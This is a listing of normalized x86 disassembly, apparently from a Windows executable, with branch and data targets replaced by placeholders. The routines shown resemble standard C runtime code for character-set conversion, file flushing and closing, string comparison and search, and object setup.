mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_415f60
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_4206ba
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_415170
pop ecx
cmp eax edi
je r-xdata
call sub_4227d0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_418e20
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_41aa23
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_415093
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_425184
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_4251b1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4162ac
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_422b24
push esi
mov ebx eax
call sub_42572a
push esi
call sub_4212e9
push eax
call sub_42565d
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_415093
pop ecx
mov [ esi + 0x1c ] edi
sub_425228
push 0xc
push r--data
call sub_415ff4
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4162ac
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_42120b
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_4251b1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42529c
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_416039
retn
mov eax [ ebp - 0x1c ]
sub_4252a4
push 0x10
push r--data
call sub_415ff4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_4162ac
mov [ eax ] 0x9
call sub_4162ac
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4153b1
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_416039
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4228f9
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_422882
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42537b
mov eax [ ebp - 0x1c ]
call sub_4162bf
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_425385
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_425560
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4255c1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_422882
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_4162d2
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_422882
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_422882
push 0x1
mov edi eax
call sub_422882
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_4227fc
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_42565d
push 0x10
push r--data
call sub_415ff4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4162bf
and [ eax ] 0x0
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] edi
call sub_4162ac
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_416039
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4228f9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4255c1
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_425720
mov eax [ ebp - 0x1c ]
sub_42572a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_415093
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_425770
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_425760
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_42582e
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_415093
and [ esi ] 0x0
pop ecx
sub_4258e2
mov edi edi
push esi
mov esi ecx
call sub_4258ae
mov eax __dos_header
lea ecx [ esi + 0x14 ]
mov [ esi ] 0x38
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] 0x900
mov [ esi + 0x10 ] r--data
call sub_425863
test eax eax
jge r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_42594a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_401dd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_425971
push 0x44
mov eax sub_425f8a
call sub_415bc0
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4030a0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_401e70
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_415cca
int3
sub_4259a9
push 0x44
mov eax sub_425f8a
call sub_415bc0
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4030a0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_425922
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_415cca
int3
sub_42638c
mov ecx rw-data
call sub_40d6f1
xor eax eax
push sub_426621
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_415f3a
pop ecx
retn
sub_4263f4
mov ecx rw-data
call sub_40d6f1
xor eax eax
push sub_42662b
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] 0x1
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_415f3a
pop ecx
retn
sub_426461
mov ecx rw-data
call sub_40d6f1
or [ rw-data ] 0xffffffff
xor eax eax
push sub_426635
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_415f3a
pop ecx
retn
sub_4264cb
mov ecx rw-data
call sub_40d6f1
xor eax eax
push sub_42663f
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] 0xfffffffe
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_415f3a
pop ecx
retn
sub_401390
push esi
mov esi ecx
call sub_4013b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_401cf0
mov [ ecx ] r--data
jmp sub_41504f
sub_401d00
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41504f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_401d30
retn
sub_401d40
mov eax [ esp + 0x10 ]
lea ecx [ eax + eax ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x8 ]
lea ecx [ eax + eax ]
mov [ esp + 0x8 ] ecx
jmp sub_4153e7
sub_401e10
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_401e70
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_401d60
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_401fa0
push esi
mov esi ecx
call sub_401fc0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_4027a9
mov eax 0x1
retn
sub_403110
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
retn
mov eax [ esi + 0x4 ]
push eax
call sub_40a5fb
add esp 0x4
sub_403320
mov ecx [ eax ]
push ecx
call sub_40a5fb
pop ecx
retn
sub_403410
push 0x24
call sub_40a5cc
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_4036cb
mov eax [ ebp - 0x14 ]
push eax
call sub_40a5fb
add esp 0x4
push 0x0
push 0x0
call sub_415cca
int3
sub_403790
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_401e90
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_403d90
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_414ff2
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_403f50
push esi
mov esi ecx
call sub_403f70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_404440
mov eax [ ecx + 0x8 ]
push eax
mov [ ecx ] r--data
call [ CloseHandle@IAT ]
retn
sub_404460
retn 0x8
sub_4044c5
mov eax sub_4044cb
retn
sub_4044cb
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4047d0
push esi
mov esi ecx
call sub_4047f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_404ca0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0xffffffff
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_404bf0
add esp 0x14
retn
sub_404e70
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push 0xf
push edx
call sub_404d60
add esp 0x10
retn
sub_4075a0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_41579a
add esp 0x8
retn
sub_4075c0
mov eax [ esp + 0x8 ]
push eax
call sub_415093
pop ecx
retn
sub_407640
retn
sub_409950
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x24 ]
add esp 0x8
retn
sub_40a070
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ edx ] eax
mov edx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] rw-data
mov [ edx ] rw-data
retn
j_sub_40a7a5
jmp sub_40a7a5
sub_40a606
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40a5cc
sub_40a611
mov eax r--data
retn
sub_40a653
mov ecx [ ebp - 0x18 ]
call sub_40a6d5
mov eax r-xdata
retn
sub_40a6d5
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_40a6e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x10 ]
sub_40a762
mov eax r--data
retn
sub_40a768
mov eax r--data
retn
sub_40a76e
mov eax r--data
retn
sub_40a774
mov eax r--data
retn
sub_40a7a5
mov edi edi
push ebp
mov ebp esp
push ecx
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] rw-data
call sub_415cca
int3
sub_40a7c1
mov edi edi
push ebp
mov ebp esp
push ecx
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] rw-data
call sub_415cca
int3
sub_40a7dd
mov edi edi
push ebp
mov ebp esp
push ecx
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] rw-data
call sub_415cca
int3
sub_40a875
retn 0x4
sub_40a878
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_40a882
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_40a8ea
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40a5fb
pop ecx
pop ebp
retn 0x4
sub_40a919
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
pop ebp
jmp [ LocalFree@IAT ]
sub_40a9c0
push 0x10
call sub_40aee8
push 0x0
push 0x0
call sub_415cca
int3
sub_40aa1e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x8007000e
jne r-xdata
push [ ebp + 0x8 ]
call sub_40c115
call sub_40a7a5
sub_40aa3a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax [ ebp + 0x8 ]
pop ebp
retn 0x4
call sub_40a7dd
sub_40ae52
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
push rw-data
mov [ rw-data ] 0x1
call [ InitializeCriticalSection@IAT ]
j_sub_40ae32
jmp sub_40ae32
sub_40af12
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
pop ebp
retn 0x4
pop ebp
jmp eax
sub_40af27
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x8
pop ebp
jmp eax
sub_40af3e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x8
pop ebp
jmp eax
sub_40b09e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
jmp sub_415fda
xor eax eax
pop ebp
retn
sub_40b0e0
push 0x8007000e
call sub_40aa1e
sub_40b20f
mov eax ecx
xor edx edx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x34 ] edx
mov [ eax + 0x54 ] edx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x50 ] edx
retn
sub_40b3ff
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
or [ eax + 0x44 ] 0xffffffff
or [ eax + 0x4c ] 0xffffffff
mov [ eax + 0x48 ] ecx
mov [ eax + 0xc ] 0x6c
mov [ eax + 0x28 ] j_sub_40a7a5
retn
sub_40b449
push 0x54
call sub_40a8fc
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_40b3ff
sub_40b45e
mov edi edi
push esi
mov esi ecx
call sub_40c614
push eax
mov ecx esi
call sub_40b30d
mov eax esi
pop esi
retn
sub_40b474
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b337
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40b48b
mov ecx [ ecx ]
sub ecx 0x10
jmp sub_40b038
sub_40b4c3
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
test eax eax
jne r-xdata
retn
jmp sub_40a7dd
sub_40b57f
push sub_40b449
call sub_40ada8
test eax eax
jne r-xdata
retn
jmp sub_40a7dd
sub_40b5bb
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx 0x10
pop esi
jmp sub_40b038
push [ esi + 0x4 ]
call [ FreeLibrary@IAT ]
sub_40b72a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b709
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40b741
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b72a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40bafe
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
call sub_40a6d5
sub_40bbc5
mov edi edi
push esi
push 0x1
mov esi ecx
call sub_40ba8a
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_40bc5d
call sub_40bc2a
mov ecx eax
add ecx 0x74
call sub_40b57f
test eax eax
jne r-xdata
retn
jmp sub_40a7dd
sub_40bcae
call sub_40b4c3
mov eax [ eax + 0x14c ]
retn
sub_40bd51
call sub_40c74b
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
sub_40c045
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
jmp sub_4161dc
xor eax eax
pop ebp
retn
sub_40c0c2
call sub_40bc2a
mov eax [ eax + 0xc ]
retn 0x4
sub_40c0f7
mov eax r--data
retn
sub_40c0fd
mov edi edi
push esi
mov esi ecx
call sub_40a878
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_40c2bd
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c29c
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c2d4
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c2bd
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c376
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
